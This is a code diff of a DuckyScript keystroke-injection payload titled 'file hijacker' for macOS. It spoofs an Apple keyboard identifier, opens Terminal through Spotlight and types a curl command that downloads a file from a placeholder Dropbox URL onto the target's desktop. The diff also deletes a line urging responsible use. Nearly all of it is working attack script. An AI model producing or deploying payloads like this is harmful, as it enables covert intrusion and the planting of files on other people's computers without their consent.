@@ -2,20 +2,20 @@ REM Author: Narsty
 REM Title: file hijacker
 REM Version 1.0 MacOs
 
-REM Replace <Enter dropbox File URL here> with the actual URL for the file you want to download.
-REM Additionally, replace file.ext with the desired name and extension for the downloaded file.
+REM Replace <dropbox URL> with the actual URL for the file you want to download.
+REM Additionally, replace filename with the desired name and extension for the downloaded file.
+REM the script will download a file to the target MacOs desktop
 
 ID 05ac:021e Apple:Keyboard
-DELAY 2000
+DELAY 500
 GUI SPACE
 DELAY 500
 STRING terminal
+DELAY 1000
+ENTER
+DELAY 500
+STRING curl -L -o ~/Desktop/<filename> "<Dropbox URL>"
 DELAY 500
 ENTER
-DELAY 2000
-STRING curl -o "file.ext" "Enter dropbox File URL here"
+DELAY 5000
 ENTER
-
-
-REM  It's crucial to use scripting and automation tools responsibly, following legal and ethical guidelines, and only for legitimate purposes.
-
